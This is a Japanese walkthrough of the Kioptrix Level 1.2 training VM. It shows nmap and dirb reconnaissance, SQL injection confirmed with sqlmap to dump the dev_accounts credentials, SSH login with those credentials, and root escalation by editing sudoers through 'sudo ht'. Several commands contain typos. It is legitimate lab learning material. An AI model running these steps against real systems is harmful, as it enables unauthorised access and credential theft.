## Description
- Kioptrix: Level 1.2 (#3)を利用してSQLインジェクションによる特権昇格を学ぶ
- Kalilinuxを攻撃サーバとしてVM環境に構築。KioptrixもVM環境で構築する

### 参考情報
https://www.vulnhub.com/
https://www.vulnhub.com/entry/kioptrix-level-12-3,24/

Kalilinuxの構築
https://qiita.com/y-araki-qiita/items/4621a21e9f0d2e38c331
Kiopritrixのサーバ構築
https://medium.com/@obikag/how-to-get-kioptrix-working-on-virtualbox-an-oscp-story-c824baf83da1

## 1, IPアドレスを特定する
- `netdiscover`コマンドにてIPを調査

## 2, 特定したIPに対してNmapスキャンを実行し、使用しているサービスを特定する
- `nmap`コマンドにて使用サービスを調査 
```
$ sudo nmap -Pn 192.168.3.38
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-02 23:35 JST
Nmap scan report for 192.168.3.38
Host is up (0.00030s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:A0:F7:AA (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
```
2つのポート(80,22)が空いてるのを確認

## 3, 80ポートが空いているのでブラウザからアクセスをしてみる
- http://192.168.3.38
Home, Blog, Login画面が表示された

## 4, dirbを使用してディレクトリ走査
```
$ dirb 192.168.3.38
```
http://192.168.3.38/gallery　というディレクトリを発見
http://192.168.3.41/gallery/gallery.php?id=1 にアクセスすると画像が表示される

## 5,　URLにMySQLインジェクションを仕込んでみる
http://192.168.3.41/gallery/gallery.php?id=1' にアクセスすると下記のエラーが確認出来た。
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' order by parentid,sort,name' at line 1Could not select category
```

## 6, SQLmapで脆弱性を診断する
sqlmap -s "http://192.168.3.41/gallery/gallery.php?id=1" --dbms MySQL -dbs
```
```
databaseにgalleryが確認できる

sqlmap -s "http://192.168.3.41/gallery/gallery.php?id=1" --dbms MySQL -dbs -D gallery --tablse
```
```
tablesにdev_accountsが確認出来た。

sqlmap -s "http://192.168.3.41/gallery/gallery.php?id=1" --dbms MySQL -dbs -D gallery --tablse -T dev_accounts --dump
```
```
usernameとpasswordが確認出来た

## 7, 取得したユーザ名とパスワードでsshでログインを実行してみる
```
$ ssh loneferret@192.168.3.41
```
ログインできた

## 8, サーバ内探索
ホームにCampanyPolicy.READMEがあるので中身を見てみると
```
$ cat CampanyPolicy.README
```
sudo htを使用しろとあるので実行する
```
$ sudo ht
```
エラーになるので環境変数を実行
```
$ export TERM=xterm
$ sudo ht
```
実行できた

## 9, sudoersを編集してrootに権限昇格させる
loneferretの行に `/bin/su` を追記し、保存する
```
$ sudo su
$ whoami
root
```

権限昇格！
